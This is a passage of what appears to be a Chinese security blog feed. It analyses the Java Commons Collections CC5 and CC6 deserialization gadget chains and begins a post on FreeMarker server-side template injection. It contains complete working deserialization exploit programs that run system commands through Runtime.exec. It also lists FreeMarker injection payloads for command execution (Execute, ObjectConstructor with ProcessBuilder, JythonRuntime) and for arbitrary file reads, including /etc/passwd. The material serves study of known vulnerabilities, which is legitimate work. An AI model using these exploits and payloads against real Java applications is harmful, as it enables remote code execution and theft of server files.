(System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意这里的readObject方法中<code>val = valObj.toString();</code>执行了toSring方法，这正好与TiedMapEntry相结合构成一条利用链，即val字段需要是TiedMapEntry对象</p>
<p>观察其构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于在构造函数中就会调用val.toString()，故会在构造POC时会触发本地的命令执行</p>
<p>另外在反序列化的时候不会触发命令执行，在执行readObject方法时val已经变成进程对象，解决办法就是通过反射将val的值赋值成为TiedMapEntry对象对象</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">commons_collections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 构建一个transformer数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 创建LazyMap对象</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry对象</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">11</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">// 通过反射设置badAttributeValueExpException的val值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化与反序列化操作</span></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试POC"><a href="#调试POC" class="headerlink" title="调试POC"></a>调试POC</h2><p>序列化的入口是BadAttributeValueExpException的readObject函数，在里面下断点</p>
<p>在执行到<code>val = valObj.toString();</code>函数前各变量的值为：</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230520171317.png"></p>
<p>其中在执行<code>Object valObj = gf.get(&quot;val&quot;, null);</code>后会命令执行一次，此时的val是一个进程对象</p>
<p>跟进toString函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230520171645.png"></p>
<p>这里会调用getKey和getValue，跟进getValue</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230520171830.png"></p>
<p>这里的map正是我们POC中构造的lazymap，跟进来到LazyMap类的get函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230520172045.png"></p>
<p>这与CC1和3链中使用LazyMap的流程一致</p>
<p>接下来就是进入transform函数执行四次for循环后命令执行</p>
<p><strong>调用栈</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transform:<span class="number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:<span class="number">131</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:<span class="number">86</span>, BadAttributeValueExpException (javax.management)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1184</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2322</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2213</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1669</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">503</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">461</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">51</span>, commons_collections5 (ysoserial)</span><br></pre></td></tr></table></figure>

<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject</span><br><span class="line">-&gt;TiedMapEntry.toString</span><br><span class="line">-&gt;LazyMap.get</span><br><span class="line">-&gt;ChainedTransformer.transform</span><br><span class="line">-&gt;ConstantTransformer.transform</span><br><span class="line">-&gt;InvokerTransformer.transform</span><br><span class="line">-&gt;Method.invoke</span><br><span class="line">-&gt;Class.getMethod</span><br><span class="line">-&gt;InvokerTransformer.transform</span><br><span class="line">-&gt;Method.invoke</span><br><span class="line">-&gt;Runtime.getRuntime</span><br><span class="line">-&gt; InvokerTransformer.transform</span><br><span class="line">-&gt;Method.invoke-&gt;Runtime.exec</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/nice0e3/p/13890340.html">Java安全之Commons Collections5分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://okaytc.github.io/posts/340e4601.html">java安全-CC5链学习与分析 | Okaytc</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化之Commons Collections6链</title>
    <url>/2023/01/17/Java-CC6/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><p>位于<code>java.util</code>包中</p>
<p>官方文档描述：</p>
<blockquote>
<p>This class implements the <code>Set</code> interface, backed by a hash table (actually a <code>HashMap</code> instance). It makes no guarantees as to the iteration order of the set; in particular, it does not guarantee that the order will remain constant over time. This class permits the <code>null</code> element.</p>
</blockquote>
<p>即HashSet是一个无序且无重复元素的集合，只有Key值，可以看成为value值固定的HashMap</p>
<p>在CC5链中，TiedMapEntry中的hashCode也调用了getValue方法，因此也可以从hashCode方法入手，由于HashMap中的put方法中会触发对key的hash计算，即hashCode函数的调用，故现在的关键是借助HashSet中的方法调用HashMap的put方法</p>
<p>HashSet中的add方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此操作相当于HashMap中值固定的put操作</p>
<p>查看HashSet中的readObject方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Consume and ignore stream fields (currently zero).</span></span><br><span class="line">    s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                         capacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Clamp load factor to range of 0.25...4.0.</span></span><br><span class="line">    loadFactor = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> + size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">    <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">    capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                              HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructing the backing map will lazily create an array when the first element is</span></span><br><span class="line">    <span class="comment">// added, so check it before construction. Call HashMap.tableSizeFor to compute the</span></span><br><span class="line">    <span class="comment">// actual allocation size. Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">    <span class="comment">// what is actually created.</span></span><br><span class="line"></span><br><span class="line">    SharedSecrets.getJavaOISAccess()</span><br><span class="line">        .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create backing HashMap</span></span><br><span class="line">    map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后的for循环调用了map的put函数</p>
<p>尽管在HashSet对使用transient修饰map</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br></pre></td></tr></table></figure>

<p>但是在序列化过程中，会逐一读取map中的元素并把元素写入流中</p>
<p>HashSet中的writeObject函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">    s.writeInt(map.capacity());</span><br><span class="line">    s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out size</span></span><br><span class="line">    s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">        s.writeObject(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时在反序列化过程中，会从流中逐一读取元素存入新的Map中，如上的readObject函数</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">commons_collections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">Testtransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,Testtransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashSet=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Testtransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashSet);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashSet.readObject</span><br><span class="line">-&gt;HashMap.put</span><br><span class="line">-&gt;HashMap.hash</span><br><span class="line">-&gt;TiedMapEntry.hashCode</span><br><span class="line">-&gt;TiedMapEntry.getValue</span><br><span class="line">-&gt;LazyMap.get</span><br><span class="line">-&gt;ChainedTransformer.transform</span><br><span class="line">-&gt;InvokerTransformer.transform</span><br><span class="line">-&gt;Runtime.exec</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://okaytc.github.io/posts/9758c0a8.html">java安全-CC6链学习与分析 | Okaytc</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13892510.html">Java安全之Commons Collections6分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之模板引擎及SSTI分析</title>
    <url>/2023/05/02/Java-SSTI/</url>
    <content><![CDATA[<h1 id="常用模板引擎"><a href="#常用模板引擎" class="headerlink" title="常用模板引擎"></a>常用模板引擎</h1><ul>
<li>FreeMarker</li>
<li>Velocity</li>
<li>Thymeleaf</li>
</ul>
<h1 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>官方文档：<br>Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. Templates are written in the FreeMarker Template Language (FTL), which is a simple, specialized language.<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230912132310.png"><br>This approach is often referred to as the MVC (Model View Controller) pattern, and is particularly popular for dynamic web pages. It helps in separating web page designers (HTML authors) from developers (Java programmers usually). Designers won’t face complicated logic in templates, and can change the appearance of a page without programmers having to change or recompile code.</p>
<p>FreeMarker技术将模板中占位变量和代码中响应给前台的数据，通过FreeMarker引擎对接直接输出响应给浏览器，提高了响应速度。<br>原理：模板+数据模型&#x3D;输出</p>
<h2 id="相关函数及常见POC"><a href="#相关函数及常见POC" class="headerlink" title="相关函数及常见POC"></a>相关函数及常见POC</h2><p><strong>new</strong><br>创建任意实现了TemplateModel接口的Java对象，同时在使用new的时候，还能够执行没有实现该接口类的静态初始化块<br>FreeMarker模板注入poc中常用的两个类：<br>freemarker.template.utility.JythonRuntime和freemarker.template.utility.Execute（这两个类都继承了TemplateModel接口）<br><strong>API</strong><br>value?api 提供对 value 的 API（通常是 Java API）的访问，例如 value?api.someJavaMethod() 或 value?api.someBeanProperty。可通过 getClassLoader获取类加载器从而加载恶意类，或者也可以通过 getResource来实现任意文件读取。<br>但是，当api_builtin_enabled为true时才可使用api函数，而该配置在2.3.22版本之后默认为false</p>
<p><strong>POC</strong><br>命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; </span><br><span class="line">&lt;#assign clazz=classLoader.loadClass(<span class="string">&quot;ClassExposingGSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign field=clazz?api.getField(<span class="string">&quot;GSON&quot;</span>)&gt; </span><br><span class="line">&lt;#assign gson=field?api.get(<span class="literal">null</span>)&gt; </span><br><span class="line">&lt;#assign ex=gson?api.fromJson(<span class="string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; </span><br><span class="line">$&#123;ex(<span class="string">&quot;open -a Calculator.app&quot;</span><span class="string">&quot;)&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="string">&quot;whoami&quot;</span>).start()&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="keyword">new</span>()&gt;&lt;<span class="meta">@value</span>&gt;<span class="keyword">import</span> os;os.system(<span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt; $&#123; ex(<span class="string">&quot;open -a Calculator.app&quot;</span>) &#125;</span><br></pre></td></tr></table></figure>

<p>文件读取：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign is=object?api.class.getResourceAsStream(<span class="string">&quot;/Test.class&quot;</span>)&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;#assign uri=object?api.class.getResource(<span class="string">&quot;/&quot;</span>).toURI()&gt;</span><br><span class="line">&lt;#assign input=uri?api.create(<span class="string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;</span><br><span class="line">&lt;#assign is=input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list <span class="number">0.</span><span class="number">.999999999</span> as _&gt;</span><br><span class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br></pre></td></tr></table></figure>

<h2 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h2><p>第一：创建SpringBoot项目javasec-ssti<br>第二：导入FreeMarker依赖</p>
